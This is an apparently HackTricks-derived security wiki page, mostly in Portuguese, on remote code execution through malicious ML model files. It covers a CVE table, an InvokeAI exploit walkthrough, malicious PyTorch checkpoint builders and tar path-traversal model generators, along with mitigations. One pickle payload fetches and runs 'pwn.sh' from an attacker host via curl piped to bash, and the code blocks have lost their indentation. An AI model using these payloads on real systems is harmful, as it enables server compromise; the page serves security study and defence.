# RCE em modelos

{{#include ../banners/hacktricks-training.md}}

## Carregando modelos para RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Ferramenta** | **Vulnerabilidade (CVE se disponível)**                                                                                      | **Vetor RCE**                                                                                                                            | **Referências**                               |
|---------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)      | *Desserialização insegura em* `torch.load` **(CVE-2025-32434)**                                                              | Pickle malicioso em checkpoint do modelo leva à execução de código (contornando a proteção `weights_only`)                                | |
| PyTorch **TorchServe**    | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + download de modelo malicioso causa execução de código; RCE por desserialização Java na API de gerenciamento                       | |
| **NVIDIA Merlin Transformers4Rec** | Desserialização insegura de checkpoint via `torch.load` **(CVE-2025-23298)**                                         | Checkpoint não confiável aciona o pickle reducer durante `load_model_trainer_states_from_checkpoint` → execução de código no worker de ML | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**      | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                     | Carregar modelo a partir de YAML usa `yaml.unsafe_load` (execução de código) <br> Carregar modelo com Lambda layer executa código Python arbitrário | |
| TensorFlow (TFLite)       | **CVE-2022-23559** (parsing TFLite)                                                                                          | Modelo `.tflite` forjado dispara estouro de inteiro → corrupção de heap (possível RCE)                                                   | |
| **Scikit-learn** (Python) | **CVE-2020-13092** (joblib/pickle)                                                                                           | Carregar um modelo via `joblib.load` executa pickle com o payload `__reduce__` do atacante                                               | |
| **NumPy** (Python)        | **CVE-2019-6446** (unsafe `np.load`) *disputado*                                                                             | O padrão de `numpy.load` permitia arrays de objetos pickled – `.npy/.npz` maliciosos disparam execução de código                         | |
| **ONNX / ONNX Runtime**   | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk) | *(No CVE)* ONNX custom ops / control flow                                                                                    | Modelo com custom operator exige carregar código nativo do atacante; grafos de modelo complexos abusam da lógica para executar computações não intencionadas | |
| **NVIDIA Triton Server**  | **CVE-2023-31036** (path traversal)                                                                                          | Usar model-load API com `--model-control` habilitado permite traversal de caminho relativo para gravar arquivos (ex.: sobrescrever `.bashrc` para RCE) | |
| **GGML (GGUF format)**    | **CVE-2024-25664 … 25668** (múltiplos heap overflows)                                                                        | Arquivo de modelo GGUF malformado causa estouros de buffer no parser, permitindo execução de código arbitrária no sistema vítima         | |
| **Keras (older formats)** | *(No new CVE)* Legacy Keras H5 model                                                                                         | Modelo HDF5 (`.h5`) malicioso com código em Lambda layer ainda executa ao carregar (safe_mode do Keras não cobre formato antigo – “downgrade attack”) | |
| **Others** (general)      | *Falha de design* – Pickle serialization                                                                                     | Muitas ferramentas de ML (ex.: formatos de modelo baseados em pickle, `pickle.load` do Python) executarão código arbitrário embutido em arquivos de modelo a menos que mitigado | |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando o arquivo fornecido é um **PyTorch checkpoint (`*.ckpt`)**, o `torch.load` realiza uma **pickle deserialization**. Como o conteúdo vem diretamente de uma URL controlada pelo usuário, um atacante pode embutir um objeto malicioso com um método `__reduce__` customizado dentro do checkpoint; o método é executado **during deserialization**, levando a **remote code execution (RCE)** no servidor InvokeAI.

A vulnerabilidade recebeu **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Passo a passo de exploração

1. Crie um checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hospede `payload.ckpt` em um servidor HTTP que você controla (por exemplo `http://ATTACKER/payload.ckpt`).
3. Acione o endpoint vulnerável (sem autenticação necessária):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. When InvokeAI downloads the file it calls `torch.load()` → the `os.system` gadget runs and the attacker gains code execution in the context of the InvokeAI process.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo o fluxo.

#### Condições

•  InvokeAI 5.3.1-5.4.2 (scan flag padrão **false**)  
•  `/api/v2/models/install` alcançável pelo atacante  
•  O processo tem permissões para executar comandos shell

#### Mitigações

* Atualize para **InvokeAI ≥ 5.4.3** – o patch define `scan=True` por padrão e realiza a verificação de malware antes da desserialização.  
* Ao carregar checkpoints programaticamente use `torch.load(file, weights_only=True)` ou o novo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Imponha listas de permissões / assinaturas para fontes de modelos e execute o serviço com privilégios mínimos.

> ⚠️ Lembre-se que **qualquer** formato baseado em pickle do Python (incluindo muitos arquivos `.pt`, `.pkl`, `.ckpt`, `.pth`) é inerentemente inseguro para desserializar a partir de fontes não confiáveis.

---

Exemplo de uma mitigação ad-hoc se você precisar manter versões antigas do InvokeAI rodando atrás de um proxy reverso:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via uso inseguro de `torch.load` (CVE-2025-23298)

O Transformers4Rec da NVIDIA (parte do Merlin) expôs um loader de checkpoints inseguro que chamava diretamente `torch.load()` em caminhos fornecidos pelo usuário. Como `torch.load` depende do Python `pickle`, um checkpoint controlado por um atacante pode executar código arbitrário via um reducer durante a desserialização.

Caminho vulnerável (pré-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por que isso leva a RCE: No Python pickle, um objeto pode definir um reducer (`__reduce__`/`__setstate__`) que retorna um callable e argumentos. O callable é executado durante o unpickling. Se tal objeto estiver presente em um checkpoint, ele é executado antes que quaisquer pesos sejam usados.

Exemplo mínimo de checkpoint malicioso:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vetores de entrega e raio de impacto:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Correção: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Orientações defensivas específicas para checkpoints do PyTorch:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Exemplo – construindo um modelo PyTorch malicioso

- Crie o modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carregar o modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelos para Path Traversal

Como comentado em [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), a maioria dos formatos de modelos usados por diferentes frameworks de AI é baseada em arquivos, geralmente `.zip`. Portanto, pode ser possível abusar desses formatos para realizar path traversal attacks, permitindo ler arquivos arbitrários do sistema onde o modelo é carregado.

Por exemplo, com o código a seguir você pode criar um modelo que criará um arquivo no diretório `/tmp` quando for carregado:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, com o código a seguir você pode criar um modelo que criará um symlink para o diretório `/tmp` quando for carregado:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Análise aprofundada: Keras .keras deserialization and gadget hunting

Para um guia focado nos internals de .keras, Lambda-layer RCE, o problema de arbitrary import em ≤ 3.8, e a descoberta de gadgets post-fix dentro da allowlist, veja:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referências

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
